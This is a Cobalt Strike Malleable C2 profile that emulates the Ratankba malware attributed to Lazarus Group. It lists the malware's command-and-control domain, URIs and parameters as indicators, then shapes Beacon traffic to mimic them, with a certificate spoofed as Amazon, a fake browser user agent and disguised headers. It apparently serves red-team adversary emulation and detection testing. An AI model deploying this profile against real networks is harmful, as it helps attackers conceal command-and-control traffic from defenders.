#ratankba malware used by 'lazarus group'
#xx0hcd
#IOC's:
#C2 = www.eye-watch.in
#C2 URI's = '/jscroll/board/list.jpg', '/design/dfbox/list.jpg', and '/design/img/list.jpg'
#C2 params = 'u=' and coresponding command string (here we use Beacon comms instead)
#C2 param1 = '?action=What&u=<string>' -- action to perform
#C2 param2 = '?action=CmdRes&u=<string>&err=kill' -- result of command error code
#C2 param3 = '?action=CmdRes&u=<string>&err=exec' -- result of command return code
#C2 param4 = '?action=BaseInfo&u=<string>' -- basic information collected

#openssl to be realistic as possible
https-certificate {
    set CN       "eye-watch.in";
    set O        "Amazon";
    set C        "US";
    set L        "Scottsdale";
    set OU       "Starfield Class";
    set ST       "Arizona";
    set validity "365";
}

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0";
set dns_idle "8.8.8.8";
set maxdns    "235";

http-get {

    set uri "/jscroll/board/list.jpg /design/dfbox/list.jpg /design/img/list.jpg";
    
    client {

        header "Host" "www.eye-watch.in";
        header "Accept" "*/*";
	header "Cookie" "0449651003fe48-Nff0eb7";
        parameter "action" "What";
        
        metadata {
            netbios;
            parameter "u";

        }



    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "nginx/1.4.6 (Ubuntu)";
        header "Connection" "close";
        

        output {
            netbios;
            print;
        }
    }
}

http-post {
    
    set uri "/jscroll/board/List.jpg /design/dfbox/List.jpg /design/img/List.jpg";
    set verb "GET";

    client {

        header "Host" "www.eye-watch.in";
        header "Accept" "*/*";
        parameter "action" "BaseInfo";
        
        output {
            netbios;
            parameter "u";


        }
        
        parameter "err" "kill";
        
        id {
            base64url;
	    prepend "0449651003fe48-";
	    header "Cookie";

        }
    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "nginx/1.4.6 (Ubuntu)";
        header "Connection" "close";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {
    server {
        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "nginx/1.4.6 (Ubuntu)";
        header "Connection" "close";
    }
}
